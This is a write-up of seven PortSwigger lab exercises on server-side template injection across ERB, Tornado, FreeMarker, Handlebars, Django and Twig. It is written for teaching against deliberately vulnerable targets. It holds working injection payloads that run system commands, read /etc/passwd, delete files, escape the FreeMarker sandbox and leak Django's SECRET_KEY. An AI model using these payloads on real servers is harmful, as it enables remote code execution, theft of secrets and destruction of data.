# Server-side template injection
## Summary
  - [Lab1: Basic server-side template injection](https://github.com/Sec0gh/Portswigger-Labs/tree/main/Server-side%20template%20injection%20Labs#lab1-basic-server-side-template-injection)
  - [Lab2: Basic SSTI (code context)](https://github.com/Sec0gh/Portswigger-Labs/tree/main/Server-side%20template%20injection%20Labs#lab2-basic-ssti-code-context)
  - [Lab3: SSTI using documentation](https://github.com/Sec0gh/Portswigger-Labs/tree/main/Server-side%20template%20injection%20Labs#lab3-ssti-using-documentation)
  - [Lab4: SSTI in an unknown language with a documented exploit](https://github.com/Sec0gh/Portswigger-Labs/tree/main/Server-side%20template%20injection%20Labs#lab4-ssti-in-an-unknown-language-with-a-documented-exploit)
  - [Lab5: SSTI with information disclosure via user-supplied objects](https://github.com/Sec0gh/Portswigger-Labs/tree/main/Server-side%20template%20injection%20Labs#lab5-ssti-with-information-disclosure-via-user-supplied-objects)
  - [Lab6: SSTI in a sandboxed environment](https://github.com/Sec0gh/Portswigger-Labs/tree/main/Server-side%20template%20injection%20Labs#lab6-ssti-in-a-sandboxed-environment)
  - [Lab7: SSTI with a custom exploit](https://github.com/Sec0gh/Portswigger-Labs/tree/main/Server-side%20template%20injection%20Labs#lab7-ssti-with-a-custom-exploit)
### Lab1: Basic server-side template injection
- When we try to view the details of the first product, There is a message appears  in a `message` parameter saying `Unfortunately this product is out of stock`.
* Generally, We will try to cause an error to know the template engine so, you can try any payload. 
- I  will use it in my payload to identify the type of the template in the website in order to identify the correct syntax for this template.
- Because the resulting error message will tell me exactly what is the template engine.
- I tried `<%foobar%>` as a test payload, but you can try any of the others, the main target is to know the template type.
![Lab1](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/lab1.png)

- The error tell us, it is an `erb` template.
- ok, after i detected and idenfied the template, i have read the documentaion of the erb.

> Check out this : https://docs.ruby-lang.org/en/2.3.0/ERB.html

- you can use this syntax to write your code: `<%= someExpression %>`. 
- you can use the `system()` method to execute arbitrary system commands.
 
```
<%= system('cat /etc/passwd') %>
<%= system('ls -al /home/carlos') %>
<%= system('rm -r /home/carlos/morale.txt') %>
``` 

-----------------------------------------------------------------------

### Lab2: Basic SSTI (code context)
- I will inject any invalid syntax for reading the error message to know the template engine.

![Lab2](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/lab2.png)

- the syntax code in the `tornado` template ==> {{user.nickname}}
- it is using python syntax in the code and the template syntax is:
	-   `{{` - Used to mark the start of a print statement.
	-   `}}` - Used to mark the end of a print statement.
	-   `{%` - Used to mark the start of a block statement.
	-   `%}` - Used to mark the end of a block statement.

- Check out it: https://www.tornadoweb.org/en/stable/template.html

* In the server side will take and compile the code as this will open `{{` then will take the value from the parameter and close with `}}`
* It will compile this code in order.
* I will do in order as the server but i will inject my payload:

>{{user.nickname......................i_will_inject_here..........................}}
                             }}{%import os%}{{os.system('ls /home/carlos')

* Then the server will close with `}}` automatically.
- So it is a payload: `}}{%import os%}{{os.system('ls /home/carlos')`
* The final form with payload after injecting in the server side it will seem like that:

> `{{user.name`  }}{%import+os%}{{os.system('ls') `}}` 
- list content of `/home` directory:

> user.name}}{%import os%}{{os.system('ls+/home')
- I removed the file with `remove("file_path")` method.

>}}{%import os%}{{os.remove("/home/carlos/morale.txt") 
- Or you can use `system()` method to execute any command on the server.

>}}{%import os%}{{os.system("rm -r /home/carlos/morale.txt")

-----------------------------------------------------------------------

### Lab3: SSTI using documentation

- As usual, i tried to cause any errors in the template.
- I have seen this formt `${.....}` then i edited it to `${foobar}`
     
![Lab3](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/Lab3.png)

![freemarker_lab3](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/freemarker_lab3.png)

- from the error message, i have known it is a `freemarker` template.

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat /etc/passwd")}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls /home/carlos")}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm -r /home/carlos/morale.txt")}
```
---------------------------------------------------------------------

### Lab4: SSTI in an unknown language with a documented exploit

At the first when it tried this payload `{{7 * 7}}`, I got this error: 

![handlebars_lab4](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/handlebars_lab4.png)

- i did some searches then i knew it is a `Handlebars` template and we can execute some commands through this code:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
      {{this.push "return require('child_process').execSync('`inject your command here`');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

-----------------------------------------------------------------------

### Lab5: SSTI with information disclosure via user-supplied objects
- Ok as usual we caused an error message and we have known this template is working with `django` web framework.

![django_lab5](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/django_lab5.png)

> It is wrong to enable `DEBUG` during developing your project because it causes the leak of some data and objects in your project.
- Check out these resources:
	- https://docs.djangoproject.com/en/4.0/howto/deployment/checklist/#debug
	- https://docs.djangoproject.com/en/4.0/ref/settings/#debug

- So if we run this payload `{% debug %}` in the template, Django will display a detailed traceback, including a lot of metadata about the environment.

![debug_lab5](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/debug_lab5.png)

- The output will contain a list of objects and properties to which you have access within this template. Crucially, notice that you can access the settings object.
- When you create a new Django project using `startproject`, the settings.py file is generated automatically, so here notice that you can access the `settings` object.
- And there is a `SECRET_KEY` attribute in the settings.
- Check out: https://docs.djangoproject.com/en/4.0/ref/settings/#secret-key

- **Finally, you will use this payload to get the secret key:** `{{settings.SECRET_KEY}}`

-----------------------------------------------------------------------

### Lab6: SSTI in a sandboxed environment
- After Detecting if there is an SSTI vulnerability through any payload will evaluate correctly like `${7 * 7}`, now we can identify the template by causing the error:

![sandbox_lab6](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/sandbox_lab6.png)

- Another one, It is a `freemarker` template engine(java).

> ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('`File_Path`').toURL().openStream().readAllBytes()?join(" ")}
- **We will set this path ==> /home/carlos/my_password.txt
 
![decimal_lab6](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/decimal_lab6.png)

- The contents of file will appear as decimal ASCII code then you can convert it to raw form.
- Check out the [decimal ascci chart](https://www.asciichart.com/).
- For doing it quickly, you can use [CyberChef](https://gchq.github.io/CyberChef/)

- Another Solution:
	- But you will identify the existing object in the template.
	- Here you will set the `product` object.

><#assign classloader=`object`.class.protectionDomain.classLoader>
  <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
  <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
  <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
  ${dwf.newInstance(ec,null)("`Execute_any_commands_here`")}

- If you will set any object rather than the intended object, this error message will appear for you.

![missing and null object_lab6](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/missing%20and%20null%20object_lab6.png)

-----------------------------------------------------------------------

### Lab7: SSTI with a custom exploit

- I captured the requst and tried with some payloads to cause an error in the template.

![Try causing error_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/Try%20causing%20error_lab7.png)

![internal server error_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/internal%20server%20error_lab7.png)

- Here we have known it is an `twig` template engine(PHP).
- And it is an invalid syntax because the template engine never expected to take a `{`  at the end of the statement.

![PoC_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/PoC_lab7.png)
- Here we injected this payload, and it has been evaluated successfully.

![Done_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/Done_lab7.png)

- I have tried to upload anything except images to see what will happen, you will see this error, and there is a method that appeared for us is called `setAvatar()`.
- And we will notice the error discloses about the path of `/home/carlos/User.php`.

![response_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/response_lab7.png)

- Ok, let's go to the request for `/my-account/change-blog-post-author-display`, and control into the user object, and use `setAvatar()` method.

![setAvatar_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/setAvatar_lab7.png)

- This error appeared, it expresses there are 2 arguments are lost in the method.

![needing 2 Arguments_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/needing%202%20Arguments_lab7.png)

- Now we need to know what are the 2 arguments to use `setAvatar()` method?
- We will add `/etc/passwd` as an avatar for the first argument.
- The template will tell us that the method need to the MIME type for tha avatar as the second argument.

>**`Take Note`: A media type** (also known as a **Multipurpose Internet Mail Extensions or MIME type**) indicates the nature and format of a document, file, or assortment of bytes.
Check out: [Common MIME Types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)

![setArguments_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/setArguments_lab7.png)

- After inserting your avatar, you have to post in the blog and then write a comment to see if your avatar has been changed.
- Take the URL for the avatar and run it in your browser.
- capture the request, and you will see the avatar which you uploaded as `/etc/passwd` it will retrieve the contents of the passwd file.
- you have to set the mime type with `image/png` to bypass it and not get the error.

![passwd_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/passwd_lab7.png)

- When we noticed the error in the path of `/home/carlaos/User.php`, let's try to know what is the content of the file.

![show content_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/show%20content_lab7.png)

![file_content_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/file_content_lab7.png)

- When we read the file we will find many functions, we will use one of them to delete `/.ssh/id_rsa`.
- We must access the file which we need to delete.

![acccess_file_lab7.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/acccess_file_lab7.png)

- During reading the content of the file of `User.php`, You will see a function called `gdprDelete()`, we will use it to delete the intended file.

![function_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/function_lab7.png)
- After accessing the file , we will delete it:

![delete file_lab7](https://github.com/Sec0gh/Portswigger-Labs/blob/main/Server-side%20template%20injection%20Labs/images/delete%20file_lab7.png)
